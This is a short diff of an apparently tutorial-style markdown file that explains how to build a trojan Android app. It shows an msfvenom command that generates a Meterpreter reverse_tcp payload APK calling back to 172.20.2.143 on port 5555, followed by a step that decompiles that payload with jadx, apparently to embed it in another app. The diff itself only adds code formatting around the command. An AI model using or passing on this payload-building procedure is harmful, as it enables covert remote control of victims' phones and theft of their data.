@@ -5,7 +5,7 @@ So how can I build it?
 1.Generate trojan apk by metasploit framework.
 
 E.g:
-msfvenom -p android/meterpreter/reverse_tcp lhost=172.20.2.143 lport=5555 R>./Payload.apk
+```msfvenom -p android/meterpreter/reverse_tcp lhost=172.20.2.143 lport=5555 R>./Payload.apk```
 
 2.Then we decompile Payload.apk by jadx-gui-1.3.3-with-jre-win(I didn't find its linux version, if you have, thanks a lot for sharing), and save the source code.
 
